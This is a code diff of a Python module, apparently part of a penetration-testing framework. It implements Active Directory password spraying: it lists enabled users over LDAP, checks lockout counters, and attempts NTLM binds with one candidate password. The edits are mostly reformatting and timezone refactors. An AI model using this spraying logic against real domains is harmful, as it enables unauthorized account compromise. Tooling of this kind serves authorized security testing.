@@ -9,7 +9,7 @@ from __future__ import annotations
 
 import json
 import time
-from datetime import datetime, timezone
+from datetime import UTC, datetime
 from pathlib import Path
 from typing import Any
 
@@ -28,7 +28,7 @@ console = Console()
 def _filetime_to_dt(ft: int) -> datetime | None:
     if not ft or ft <= 0:
         return None
-    return datetime.fromtimestamp(ft / 10_000_000 - 11644473600, tz=timezone.utc)
+    return datetime.fromtimestamp(ft / 10_000_000 - 11644473600, tz=UTC)
 
 
 def _read_lockout_policy(conn: Any, base_dn: str) -> dict[str, int]:
@@ -49,13 +49,16 @@ def _read_lockout_policy(conn: Any, base_dn: str) -> dict[str, int]:
     return policy
 
 
-def _load_users(source: str, conn: Any, base_dn: str, filter_expr: str | None) -> list[str]:
+def _load_users(source: str | None, conn: Any, base_dn: str, filter_expr: str | None) -> list[str]:
     path = Path(source).expanduser() if source else None
     if path and path.is_file():
-        return [line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]
+        return [
+            line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()
+        ]
     conn.search(
         base_dn,
-        filter_expr or "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
+        filter_expr
+        or "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
         search_scope=SUBTREE,
         attributes=["sAMAccountName", "badPwdCount", "badPasswordTime"],
     )
@@ -67,9 +70,7 @@ def _load_users(source: str, conn: Any, base_dn: str, filter_expr: str | None) -
     return users
 
 
-def _account_lockout_state(
-    conn: Any, base_dn: str, sam: str
-) -> tuple[int, datetime | None]:
+def _account_lockout_state(conn: Any, base_dn: str, sam: str) -> tuple[int, datetime | None]:
     conn.search(
         base_dn,
         f"(sAMAccountName={sam})",
@@ -88,7 +89,9 @@ def _try_bind(target: Target, username: str, password: str, ldaps: bool) -> tupl
     server = Server(target.dc_ip, use_ssl=ldaps, get_info=None)
     user_dn = f"{target.domain}\\{username}"
     try:
-        conn = Connection(server, user=user_dn, password=password, authentication="NTLM", auto_bind=True)
+        conn = Connection(
+            server, user=user_dn, password=password, authentication="NTLM", auto_bind=True
+        )
         conn.unbind()
         return True, "ok"
     except Exception as exc:  # noqa: BLE001
@@ -112,11 +115,11 @@ class PasswordSpray:
         force: bool = False,
         **kwargs: Any,
     ) -> dict[str, Any]:
-        password = kwargs.get("password_to_try") or kwargs.get("spray_password") or kwargs.get("value")
+        password = (
+            kwargs.get("password_to_try") or kwargs.get("spray_password") or kwargs.get("value")
+        )
         if not password:
-            raise RuntimeError(
-                "Pass -P spray_password=<candidate> (or --value)."
-            )
+            raise RuntimeError("Pass -P spray_password=<candidate> (or --value).")
         users_source = kwargs.get("users") or kwargs.get("userlist")
         user_filter = kwargs.get("user_filter")
         safety_margin = int(kwargs.get("safety_margin", 2))
@@ -159,7 +162,7 @@ class PasswordSpray:
                 "bad_pwd_count_pre": bad,
                 "ok": ok,
                 "note": note,
-                "attempted_at": datetime.now(timezone.utc).isoformat(),
+                "attempted_at": datetime.now(UTC).isoformat(),
             }
             attempts.append(record)
             if ok:
